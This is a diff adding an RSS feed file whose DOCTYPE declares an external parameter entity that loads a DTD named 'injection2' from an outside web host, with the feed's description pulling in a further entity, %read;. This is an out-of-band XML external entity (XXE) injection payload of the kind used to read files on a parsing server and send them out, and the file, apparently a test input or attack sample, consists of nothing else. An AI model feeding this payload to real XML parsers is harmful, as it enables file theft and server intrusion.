@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE channel [<!ENTITY % data SYSTEM "http://users.tpg.com.au/atjhin/injection2">%data;]>
+<rss version="2.0">
+<channel>
+    <item>
+        <title>rip</title>
+        <link>http://example.com</link>
+        <description>%read;</description>
+    </item>
+</channel>
+</rss>
